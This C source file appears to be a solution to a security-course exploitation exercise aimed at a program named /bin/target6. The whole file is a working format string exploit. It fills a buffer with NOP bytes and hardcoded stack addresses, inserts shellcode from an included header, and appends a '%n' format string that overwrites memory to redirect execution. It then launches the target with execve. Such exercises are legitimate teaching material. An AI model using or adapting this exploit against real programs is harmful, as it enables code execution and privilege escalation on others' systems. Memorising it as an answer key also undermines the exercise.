#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/bin/target6"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[200];

  // set buf to nops
  memset(buf, 0x90, sizeof(buf)-1);

  buf[sizeof(buf)-1] = '\0';

  // provide %n address to be dereferenced
  *(int*)(buf + 4) = 0xffffdd84;
  *(int*)(buf + 12) = 0xffffdd85;
  *(int*)(buf + 20) = 0xffffdd86;
  *(int*)(buf + 24) = 0xffffdd87;

  // copy the shellcode
  memcpy(buf + 32, shellcode, sizeof(shellcode) - 1);

  // copy the format
  memcpy( buf + sizeof(shellcode) + 31, "%107d%n%36d%n%35d%n%n", 21);

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
